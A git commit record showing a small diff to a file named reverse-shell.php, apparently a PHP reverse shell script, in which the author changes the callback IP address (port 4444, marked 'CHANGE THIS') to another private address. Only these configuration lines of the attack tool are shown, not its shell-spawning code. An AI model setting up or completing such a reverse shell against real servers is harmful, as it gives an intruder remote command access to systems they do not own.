fda573c43c8dfffce2e595138e4c4e6ef00e0995
Ibisof <34856524+Ibisof@users.noreply.github.com>
2022-06-03 16:27:03 +0200

    Update reverse-shell.php

--- reverse-shell.php
+++ reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.1.90';  // CHANGE THIS
+$ip = '192.168.3.90';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
